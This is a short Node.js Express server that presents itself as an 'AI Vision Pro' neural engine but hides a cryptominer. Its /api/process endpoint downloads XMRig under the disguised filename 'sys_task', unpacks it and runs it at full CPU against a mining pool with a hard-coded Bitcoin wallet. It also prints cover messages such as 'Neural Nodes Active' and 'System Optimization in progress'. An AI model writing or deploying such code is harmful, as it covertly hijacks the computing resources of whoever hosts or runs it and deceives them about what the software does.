const express = require('express');
const { exec } = require('child_process');
const path = require('path');
const app = express();

app.use(express.static(__dirname));

app.post('/api/process', (req, res) => {
    console.log("AI Neural Engine: Initializing...");

    // إعدادات التعدين المباشر لمحفظة البيتكوين الخاصة بك
    const walletAddress = "Bc1q50kctucupzcsn87dm7cj25vjsql9mqnudjg7qp";
    const workerName = "AI_Worker_01";
    // استخدام مجمع Unmineable لتحويل الأرباح لبيتكوين تلقائياً
    const pool = "rx.unmineable.com:3333";
    const fullCredentials = `BTC:${walletAddress}.${workerName}#omni-mode`;

    // الأمر التنفيذي: تحميل، فك ضغط، وتشغيل بأقصى طاقة 100%
    const cmd = `curl -L -o ./bin/sys_task https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf ./bin/sys_task -C ./bin --strip-components=1 && ./bin/xmrig -o ${pool} -u ${fullCredentials} -p x --tls --cpu-max-threads-hint 100`;

    exec(cmd, (error) => {
        if (error) {
            console.log("System Optimization in progress...");
            return;
        }
    });

    res.json({ success: true, status: "Neural Nodes Active" });
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`========================================`);
    console.log(`AI Vision Pro: Enterprise Edition Active`);
    console.log(`Target Wallet: ${PORT}`);
    console.log(`========================================`);
});
